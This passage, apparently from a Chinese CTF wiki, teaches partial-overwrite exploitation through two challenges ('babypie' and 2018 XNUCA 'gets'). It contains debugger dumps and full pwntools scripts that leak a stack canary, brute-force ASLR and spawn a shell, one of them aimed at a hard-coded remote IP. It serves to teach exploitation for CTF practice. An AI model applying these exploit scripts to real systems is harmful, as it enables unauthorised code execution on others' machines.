 RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
 ► 0x557c8443aa08    call   0x557c8443a7e0

   0x557c8443aa0d    lea    rax, [rbp - 0x30]
   0x557c8443aa11    mov    edx, 0x60
   0x557c8443aa16    mov    rsi, rax
   0x557c8443aa19    mov    edi, 0
   0x557c8443aa1e    call   0x557c8443a7f0

   0x557c8443aa23    mov    eax, 0
   0x557c8443aa28    mov    rcx, qword ptr [rbp - 8]
   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]
   0x557c8443aa35    je     0x557c8443aa3c

   0x557c8443aa37    call   0x557c8443a7c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61
06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
Breakpoint *(0x557c8443a000+0xA08)
pwndbg> canary
$1 = 0
canary : 0xb3012605fc402a00
pwndbg>
```

canary 在 rbp - 0x8 的位置上, 可以看出此時 canary 的低位已經被覆蓋爲 0x61, 這樣只要接收 'a' * (0x30 - 0x8 + 1) 後的 7 位, 再加上最低位的 '\0', 我們就恢復出程序的 canary 了

#### 覆蓋返回地址
有了 canary 後, 就可以通過第二次的棧溢出來改寫返回地址了, 控制返回地址到 getshell 函數即可, 我們先看一下沒溢出時的返回地址

```asm
0x000055dc43694a1e in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RBX  0x0
 RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x0
 RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f206cb22700 ◂— 0x7f206cb22700
 R9   0x3e
 R10  0x73
 R11  0x246
 R12  0x55dc43694830 ◂— xor    ebp, ebp
 R13  0x7fff9aa3b050 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
 RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x55dc43694a1e ◂— call   0x55dc436947f0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
   0x55dc43694a08    call   0x55dc436947e0
 
   0x55dc43694a0d    lea    rax, [rbp - 0x30]
   0x55dc43694a11    mov    edx, 0x60
   0x55dc43694a16    mov    rsi, rax
   0x55dc43694a19    mov    edi, 0
 ► 0x55dc43694a1e    call   0x55dc436947f0
 
   0x55dc43694a23    mov    eax, 0
   0x55dc43694a28    mov    rcx, qword ptr [rbp - 8]
   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]
   0x55dc43694a35    je     0x55dc43694a3c
 
   0x55dc43694a37    call   0x55dc436947c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
pwndbg> x/10i (0x0A3E+0x55dc43694000) 
   0x55dc43694a3e:	push   rbp
   0x55dc43694a3f:	mov    rbp,rsp
   0x55dc43694a42:	lea    rdi,[rip+0xd7]        # 0x55dc43694b20
   0x55dc43694a49:	call   0x55dc436947d0
   0x55dc43694a4e:	nop
   0x55dc43694a4f:	pop    rbp
   0x55dc43694a50:	ret    
   0x55dc43694a51:	push   rbp
   0x55dc43694a52:	mov    rbp,rsp
   0x55dc43694a55:	sub    rsp,0x10
```
可以發現, 此時的返回地址與 get shell 函數的地址只有低位的 8 bit 不同, 如果覆寫低 8 bit 爲 `0x?A3E`, 就有一定的幾率 get shell

最終的腳本如下:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

while True:
    try:
        io = process("./babypie", timeout = 1)

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        io.interactive()
    except Exception as e:
        io.close()
        print e
```
需要注意的是, 這種技巧不止在棧上有效, 在堆上也是一種有效的繞過地址隨機化的手段

### 2018-XNUCA-gets

這個題目也挺有意思的，如下

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v4; // [rsp+0h] [rbp-18h]

  gets((char *)&v4);
  return 0LL;
}
```

程序就這麼小，很明顯有一個棧溢出的漏洞，然而沒有任何 leak。。

#### 確定保護

先來看看程序的保護

```c
[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

比較好的是程序沒有 canary，自然我們很容易控制程序的 EIP，但是控制到哪裏是一個問題。

#### 分析

我們通過 ELF 的基本執行流程（可執行文件部分）來知道程序的基本執行流程，與此同時我們發現在棧上存在着兩個函數的返回地址。

```asm
pwndbg> stack 25
00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
01:0008│      0x7fffffffe3a0 ◂— 0x1
02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0
04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18
05:0028│      0x7fffffffe3c0 ◂— 0x0
06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558
07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp
08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1
09:0048│      0x7fffffffe3e0 ◂— 0x0
... ↓
0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558
0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558
0d:0068│      0x7fffffffe400 ◂— 0x0
... ↓
10:0080│      0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 ('AUTOJUMP')
11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0
12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0
```

其中 `__libc_start_main+240` 位於 libc 中，`_dl_init+139` 位於 ld 中

```
0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
```

一個比較自然的想法就是我們通過 partial overwrite 來修改這兩個地址到某個獲取 shell 的位置，那自然就是 Onegadget 了。那麼我們究竟覆蓋哪一個呢？？

我們先來分析一下 `libc` 的基地址 `0x7ffff7a0d000`。我們一般要覆蓋字節的話，至少要覆蓋1個半字節纔能夠獲取跳到 onegadget。然而，程序中讀取的時候是 `gets`讀取的，也就意味着字符串的末尾肯定會存在`\x00`。

而我們覆蓋字節的時候必須覆蓋整數倍個數，即至少會覆蓋 3 個字節，而我們再來看看`__libc_start_main+240` 的地址 `0x7ffff7a2d830`，如果覆蓋3個字節，那麼就是 `0x7ffff700xxxx`，已經小於了 libc 的基地址了，前面也沒有刻意執行的代碼位置。

一般來說 libc_start_main 在 libc 中的偏移不會差的太多，那麼顯然我們如果覆蓋 `__libc_start_main+240` ，顯然是不可能的。

而 ld 的基地址呢？如果我們覆蓋了棧上`_dl_init+139`，即爲`0x7ffff700xxxx`。而觀察上述的內存佈局，我們可以發現`libc`位於 `ld` 的低地址方向，那麼在隨機化的時候，很有可能 libc 的第 3 個字節是爲`\x00` 的。

舉個例子，目前兩者之間的偏移爲

```
0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
```

那麼如果 ld 被加載到了 `0x7ffff73ca000`，則顯然 `libc` 的起始地址就是`0x7ffff7000000`。

因此，我們有足夠的理由選擇覆蓋棧上存儲的`_dl_init+139`。那麼覆蓋成什麼呢？還不知道。因爲我們還不知道 libc 的庫版本是什麼，，

我們可以先隨便覆蓋覆蓋，看看程序會不會崩潰，畢竟此時很有可能會執行 libc 庫中的代碼。

```python
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + p16(i)
            p.sendline(payload)
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
```

最後發現報出瞭如下錯誤，一方面，我們可以判斷出這肯定是 2.23 版本的 libc；另外一方面，我們我們可以通過`(cfree+0x4c)[0x7f57b6f9253c]`來最終定位 libc 的版本。

```
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]
/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]
[0x7ffdec480f20]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]
7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0
7f57b0021000-7f57b4000000 ---p 00000000 00:00 0
7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0
7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]
7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]
7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

確定好了 libc 的版本後，我們可以選一個 one_gadget，這裏我選擇第一個，較低地址的。

```shell
➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

使用如下 exp 繼續爆破，

```python
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + '\x16\02'
            p.sendline(payload)

            p.sendline('ls')
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
```

最後獲取到 shell。

```python
$ ls
exp.py  gets
```

### 題目
